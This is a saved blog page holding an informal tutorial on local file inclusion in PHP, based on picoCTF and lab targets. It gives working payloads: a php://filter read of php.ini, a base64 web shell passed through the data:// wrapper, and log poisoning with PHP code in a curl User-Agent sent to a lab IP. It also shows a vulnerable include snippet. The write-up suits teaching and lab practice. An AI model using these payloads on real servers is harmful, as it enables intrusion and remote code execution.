@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Secrets of LFI🤫</title>
+    <link rel="stylesheet" href="../assets/built/screen.css@v=9a91bfc353.css">
+
+
+    <style>
+        :root {
+            --background-color: #111111
+        }
+    </style>
+
+    <script>
+        /* The script for calculating the color contrast was taken from
+        https://gomakethings.com/dynamically-changing-the-text-color-based-on-background-color-contrast-with-vanilla-js/ */
+        var accentColor = getComputedStyle(document.documentElement).getPropertyValue('--background-color');
+        accentColor = accentColor.trim().slice(1);
+        var r = parseInt(accentColor.substr(0, 2), 16);
+        var g = parseInt(accentColor.substr(2, 2), 16);
+        var b = parseInt(accentColor.substr(4, 2), 16);
+        var yiq = ((r * 299) + (g * 587) + (b * 114)) / 1000;
+        var textColor = (yiq >= 128) ? 'dark' : 'light';
+
+        document.documentElement.className = `has-${textColor}-text`;
+    </script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+        <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,600;0,700;1,400;1,700&display=swap" rel="stylesheet">
+
+    <link rel="icon" href="../content/images/size/w256h256/2024/03/Group-5-1--1-.png" type="image/png">
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Isuk4 ">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Secrets of LFI🤫">
+    <meta property="og:description" content="Yo yo homies Guess what? I lunched my web .ok so you can see my crackhead blog and portfolio :- so lets start
+
+Layout handling is crucial in web dev .But sometimes silly dev use to handle layout like this
+
+http://example.com/home.php?page&#x3D;profile.php
+
+And as">
+    <meta property="og:url" content="http://localhost:2368/lfi/">
+    <meta property="og:image" content="http://localhost:2368/content/images/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp">
+    <meta property="article:published_time" content="2024-03-12T13:40:37.000Z">
+    <meta property="article:modified_time" content="2024-03-12T13:40:37.000Z">
+    <meta property="article:tag" content="Web exploits">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/isuka.cracker">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Secrets of LFI🤫">
+    <meta name="twitter:description" content="Yo yo homies Guess what? I lunched my web .ok so you can see my crackhead blog and portfolio :- so lets start
+
+Layout handling is crucial in web dev .But sometimes silly dev use to handle layout like this
+
+http://example.com/home.php?page&#x3D;profile.php
+
+And as">
+    <meta name="twitter:url" content="http://localhost:2368/lfi/">
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Isuka sanuj">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="Web exploits">
+    <meta name="twitter:site" content="@ghost">
+    <meta property="og:image:width" content="720">
+    <meta property="og:image:height" content="312">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Isuk4 ",
+        "url": "http://localhost:2368/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://localhost:2368/content/images/2024/03/Group-5-1--1--1.png"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Isuka sanuj",
+        "url": "http://localhost:2368/author/isuka/",
+        "sameAs": []
+    },
+    "headline": "Secrets of LFI🤫",
+    "url": "http://localhost:2368/lfi/",
+    "datePublished": "2024-03-12T13:40:37.000Z",
+    "dateModified": "2024-03-12T13:40:37.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "http://localhost:2368/content/images/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp",
+        "width": 720,
+        "height": 312
+    },
+    "keywords": "Web exploits",
+    "description": "Yo yo homies Guess what? I lunched my web .ok so you can see my crackhead blog and portfolio :- so lets start\n\nLayout handling is crucial in web dev .But sometimes silly dev use to handle layout like this\n\nhttp://example.com/home.php?page&#x3D;profile.php\n\nAnd as we navigate through this layout the page parameter changes to filenames\n\nSo lets see how it can be a security risk.\n\n\nWhat is LFI\n\nLocal File Inclusion is an attack technique in which attackers trick a web application into either running or ",
+    "mainEntityOfPage": "http://localhost:2368/lfi/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.80">
+    <link rel="alternate" type="application/rss+xml" title="Isuk4 " href="../rss/index.html">
+    
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="26b2165395d797e61c718352f9" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="http://localhost:2368/" crossorigin="anonymous"></script><style>:root {--ghost-accent-color: #101010;}</style>
+    
+    <link href="http://localhost:2368/webmentions/receive/" rel="webmention">
+</head>
+
+<body class="post-template tag-web-exploits is-font-sans">
+<div class="gh-site">
+
+        
+<header id="gh-head" class="gh-head gh-outer is-head-middle-logo">
+    <div class="gh-head-inner gh-inner">
+        <div class="gh-head-brand">
+            <div class="gh-head-brand-wrapper">
+                <a class="gh-head-logo" href="../index.html">
+                        <img src="../content/images/2024/03/Group-5-1--1--1.png" alt="Isuk4 ">
+                </a>
+            </div>
+            <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+    <path d="M17.5 17.5L12.5 12.5L17.5 17.5ZM14.1667 8.33333C14.1667 9.09938 14.0158 9.85792 13.7226 10.5657C13.4295 11.2734 12.9998 11.9164 12.4581 12.4581C11.9164 12.9998 11.2734 13.4295 10.5657 13.7226C9.85792 14.0158 9.09938 14.1667 8.33333 14.1667C7.56729 14.1667 6.80875 14.0158 6.10101 13.7226C5.39328 13.4295 4.75022 12.9998 4.20854 12.4581C3.66687 11.9164 3.23719 11.2734 2.94404 10.5657C2.65088 9.85792 2.5 9.09938 2.5 8.33333C2.5 6.78624 3.11458 5.30251 4.20854 4.20854C5.30251 3.11458 6.78624 2.5 8.33333 2.5C9.88043 2.5 11.3642 3.11458 12.4581 4.20854C13.5521 5.30251 14.1667 6.78624 14.1667 8.33333Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+</svg>
+</button>
+            <button class="gh-burger"></button>
+        </div>
+
+        <nav class="gh-head-menu">
+            <ul class="nav">
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+    <li class="nav-about"><a href="../about-this-site/index.html">About</a></li>
+    <li class="nav-web"><a href="../tag/web-exploits/index.html">Web</a></li>
+    <li class="nav-fun"><a href="../tag/fun-stuff/index.html">Fun</a></li>
+</ul>
+
+        </nav>
+
+        
+    </div>
+</header>
+
+    
+
+<main class="gh-main">
+    <article class="gh-article post tag-web-exploits">
+
+        <header class="gh-article-header gh-canvas">
+            <span class="gh-article-meta"><!--
+            -->
+                        <a class="gh-article-meta-tag" href="../tag/web-exploits/index.html">Web exploits</a>
+<!--
+            --></span>
+
+            <h1 class="gh-article-title">Secrets of LFI🤫</h1>
+
+
+                    <figure class="gh-article-image kg-width-wide">
+                        <img
+                            srcset="../content/images/size/w300/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 300w,
+                                   ../content/images/size/w720/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webpp 720w,
+                                  ../content/images/size/w960/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webpbp 960w,
+                                 ../content/images/size/w1200/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webpebp 1200w,
+                                ../content/images/size/w2000/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webpwebp 2000w"
+                            sizes="(max-width: 1200px) 100vw, 1200px"
+                            src="../content/images/size/w1200/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp"
+                            alt="Secrets of LFI🤫"
+                        >
+                    </figure>
+        </header>
+
+    <section class="gh-content gh-canvas">
+        <p>Yo yo homies Guess what? I lunched my&nbsp;<a href="http://isuk4.com/" rel="noopener ugc nofollow">web</a>&nbsp;.ok so you can see my crackhead blog and portfolio :- so lets start</p><p>Layout handling is crucial in web dev .But sometimes silly dev use to handle layout like this</p><blockquote><a href="http://example.com/home.php?page=profile.php" rel="noopener ugc nofollow">http://example.com/home.php?page=profile.php</a></blockquote><p>And as we navigate through this layout the page parameter changes to filenames</p><p>So lets see how it can be a security risk.</p><h1 id="what-is-lfi">What is LFI</h1><p>Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server.</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:268/1*wNyN_g9CPCRPYszxrk66rQ.gif" class="kg-image" alt="" loading="lazy" width="268" height="274"></figure><p>Simply LFI is attack technique that attacker running or exposing files from server😎</p><p>So lets see examples of LFI</p><h1 id="lfi-example">LFI example</h1><blockquote>this is ctf(picoCTF forbidden path) so notice that real world application can be different</blockquote><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*k8p5f9Li_4nImAFTQyKhIA.png" class="kg-image" alt="" loading="lazy" width="700" height="368"></figure><p>this website includes any files that we input to this web so I’m trying to get /etc/passwd from this web</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*A3kgY8PqnNRP_pNXJAqt-g.png" class="kg-image" alt="" loading="lazy" width="700" height="398"></figure><p>Booom .Now I think you understood what is LFI.so lets see how we can exploit this</p><p>There are lots of ways to exploit LFI it is depends the system .so lets see what are the ways to get rce from LFI</p><ul><li>PHP Wrappers</li><li>Log poisoning</li><li>Uploaded File inclusion</li></ul><h1 id="php-wrappers">PHP Wrappers</h1><p>PHP stream wrappers are a feature that provides a unified way of accessing different types of data sources or protocols using a common interface. In essence, stream wrappers allow you to use the same set of functions to read from or write to various types of resources, such as files, HTTP, FTP, databases, and more. They abstract the underlying complexity of handling different types of streams.</p><p>ok lets see how we can use this to exploit lfi</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*te4CCsWMKRe6-Rft8L_ynw.png" class="kg-image" alt="" loading="lazy" width="700" height="368"></figure><p>so you can see this page is include the file in lang parameter.so i tried to include /etc/passwd to the page</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*CngMArTwmDHeICek9z81zg.png" class="kg-image" alt="" loading="lazy" width="700" height="368"></figure><p>yeeah there is a lfi :) so lets get a RCE from data wrapper</p><p>first we need to check is allow_url_include enabled or not cause data wrapper only available when allow_url_include enabled . ok lets check</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*drwViGC9wUpEzrmUta1WYg.png" class="kg-image" alt="" loading="lazy" width="700" height="231"></figure><pre><code class="language-URL">php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini</code></pre><p>we use a wrapper again😂in this we encode the php.ini file cause prevent it from execute from the web</p><p>now lets run and check</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*fR2v3KzmV5ZHFr73OT33vA.png" class="kg-image" alt="" loading="lazy" width="700" height="358"></figure><p>and we need to decode it</p><pre><code>echo "W1BIUF0KCjs7Ozs7Ozs7Ozs7Ozs7Ozs..." | base64 -d | grep allow_url_include</code></pre><p>and out put will like this</p><p>allow_url_include = On</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:498/1*1INdaxAHtiX3G9kC-bAZ9Q.gif" class="kg-image" alt="" loading="lazy" width="498" height="498"></figure><p>ok so lets do this then</p><p>You know we can use&nbsp;<a href="https://www.php.net/manual/en/wrappers.data.php" rel="noopener ugc nofollow">data wrapper</a>&nbsp;to include external data to web(include php)</p><pre><code>
+&lt;?php
+
+$fp = fopen('data:text/plain,'.urlencode($data), 'rb'); // urlencoded data
+
+$fp = fopen('data:text/plain;base64,'.base64_encode($data), 'rb'); // base64 encoded data
+
+?&gt;
+
+
+
+Demonstration of invalid usage:
+
+&lt;?php
+
+$data = 'Günther says: 1+1 is 2, 10%40 is 20.';
+
+
+
+$fp = fopen('data:text/plain,'.$data, 'rb'); // INVALID, never do this
+
+echo stream_get_contents($fp);
+
+// Günther says: 1 1 is 2, 10@ is 20. // ERROR
+
+
+
+$fp = fopen('data:text/plain,'.urlencode($data), 'rb'); // urlencoded data
+
+echo stream_get_contents($fp);
+
+// Günther says: 1+1 is 2, 10%40 is 20. // OK
+
+
+
+// Valid option 1: base64 encoded data
+
+$fp = fopen('data:text/plain;base64,'.base64_encode($data), 'rb'); // base64 encoded data
+
+echo stream_get_contents($fp);
+
+// Günther says: 1+1 is 2, 10%40 is 20. // OK
+
+?&gt;</code></pre><p>so we are gonna get a reverse shell from data wrapper</p><pre><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' | base64</code></pre><p>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==</p><p>so we are gonna include this base64(we can also use urlencode ) code and decode it on the web site so it will execute the php code</p><pre><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=whoami</code></pre><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*VEnNsAOTrLHEM_QEs25jhQ.png" class="kg-image" alt="" loading="lazy" width="700" height="366"></figure><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:498/1*jhHt00g5SEgepFrLkWTpqg.gif" class="kg-image" alt="" loading="lazy" width="498" height="280"></figure><p>so it worked .Now lets see how we can do this with log poisoning</p><h1 id="what-is-log-poisoning">What is Log poisoning</h1><p>Log poisoning is attack technique that inject a malicious code to server log files.so we can include that log file and execute that:</p><p>so lets see how we can do it</p><p>So you know log files log our request detail so if we inject malicious code to a request header that means it will saved on the log.</p><p>so lets start</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*PeLx-gyM_Aiec_cH5vvnwA.png" class="kg-image" alt="" loading="lazy" width="700" height="343"></figure><p>So i found the log file and included it .Now I’m going to log poisoning</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*SNdLjvvzsAwEnUg79ONdIg.png" class="kg-image" alt="" loading="lazy" width="700" height="336"></figure><p>Ok I sent a request with curl and set my user agent as php code that ouput the username</p><pre><code>curl -A "&lt;?php system('whoami'); ?&gt;" 94.237.62.99:37999/index.php?language=en.php</code></pre><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*EQ2uOxEud8RJzg_CPej0hA.png" class="kg-image" alt="" loading="lazy" width="700" height="363"></figure><p>yeeah it gives us the username “www-data”. so let me try another code</p><pre><code>curl -A "&lt;?php phpinfo(); ?&gt;" 94.237.62.99:37999/index.php?language=en.php</code></pre><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*3vQ-S9dTJIqIGK5ni5aVSg.png" class="kg-image" alt="" loading="lazy" width="700" height="366"></figure><p>yeah baby So this is it Log poisoning</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:498/1*63tPhDfBNG7KBIW9_2XW5A.gif" class="kg-image" alt="" loading="lazy" width="498" height="280"></figure><p>but There is an always catch.</p><p>Some website have lfi with stranded php extenion</p><pre><code>&lt;?php 
+include($_GET['file'].".php");
+?&gt;</code></pre><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:498/1*Ld_nv5NEI4bvrijT9SM2dQ.gif" class="kg-image" alt="" loading="lazy" width="498" height="245"></figure><p>So what can we do for this</p><ul><li>we can get the source code of files</li><li>we can try to get rce with pearcmd.php</li></ul><h1 id="we-can-get-the-source-code-of-files">we can get the source code of files</h1><p>so I told you about php wrappers. now we can use those things for to get source code.</p><p>Do you remember that How I got the php.ini file.now we are gonna do the same</p><p>base64 it with php wrapper</p><figure class="kg-card kg-image-card"><img src="https://miro.medium.com/v2/resize:fit:700/1*YuKOdJzOcVIBIGr87l3iyg.png" class="kg-image" alt="" loading="lazy" width="700" height="368"></figure><p>yeeah all we need to do now is decode this and get the source code</p><pre><code>echo "PD9waHAKJHAyID0gIjxwPlRoZSBpZGVhIG9mIH…" | base64 -d</code></pre><p>So let’s talk about the Pearcmd method in the next post because if I add more things, the post will be boring</p><p>So I will be back with LFI part 2</p><pre><code>echo "I will be back with LFI part 2"</code></pre>
+    </section>
+
+
+</article>    </main>
+
+
+
+    
+<footer class="gh-foot gh-outer">
+  <div class="gh-foot-inner gh-inner">
+    <nav class="gh-foot-menu">
+      
+    </nav>
+
+    <div class="gh-copyright">
+        Isuk4.com © 2024
+    </div>
+  </div>
+</footer>
+</div>
+
+    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="pswp__bg"></div>
+
+    <div class="pswp__scroll-wrap">
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="../assets/built/main.min.js@v=9a91bfc353"></script>
+
+
+
+</body>
+
+</html>
